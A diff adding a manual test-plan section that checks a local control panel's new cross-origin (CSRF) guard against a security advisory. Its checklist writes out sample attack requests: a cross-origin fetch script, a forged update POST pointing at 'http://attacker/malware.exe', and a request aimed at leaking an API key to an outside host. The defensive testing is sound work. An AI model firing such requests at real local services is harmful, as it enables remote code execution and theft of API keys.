@@ -2030,6 +2030,31 @@ Notes:
 
 ---
 
+### 19.10 Control-panel cross-origin (CSRF) guard — GHSA-3mxj-5926-rqmr  🌐 PANEL
+> The panel binds to `127.0.0.1:8765` and now refuses state-changing requests driven from any OTHER
+> web origin (the fix for the drive-by RCE / key-exfiltration / destructive-CSRF advisory). Verify a
+> foreign page can't reach the write endpoints, while the panel itself still works. Do this with the
+> UI build running; the "attacker" page is any HTML file opened from a *different* origin (a
+> `file://` page, or a page served on another port).
+- [ ] 🌐 **Panel still fully works:** with the app running, use the panel normally — change a setting,
+  send a typed prompt, hit **CANCEL**, save a key. All succeed (same-origin requests are unaffected).
+- [ ] 🌐 **Cross-origin write is refused:** open a scratch page on another origin (e.g. save
+  `<script>fetch("http://127.0.0.1:8765/api/cancel",{method:"POST"}).then(r=>alert(r.status))</script>`
+  as a `.html` and open it from disk, or serve it on `:8000`). The alert shows **403** and the app
+  does **not** cancel / act. In DevTools the response is a `cross-origin request refused` JSON body.
+- [ ] 🌐 **Forged update can't run:** from that same foreign page, POST to `/api/update/apply` with
+  `{asset_url:"http://attacker/malware.exe"}` → **403** (guard), and even if it reached the endpoint
+  the server ignores the body and only ever downloads the real GitHub release asset. Nothing launches.
+- [ ] 🌐 **Key isn't exfiltrated:** with an OpenAI-compatible key set, load
+  `http://127.0.0.1:8765/api/catalog?source=@openai_models&base_url=https://example.com` from the
+  foreign page → response is `{options:[], error:"… not an allowed endpoint"}` and no request carrying
+  your key reaches `example.com` (watch the network tab). Picking a real preset in Settings still lists
+  models normally.
+
+Notes:
+
+---
+
 ## Needs-hardware / manual-only note
 Everything in this file needs Doug's machine and can't be exercised in CI or a sandbox:
 - 🔊 **HW** (mic + speakers) gates nearly every step — STT capture and TTS playback.
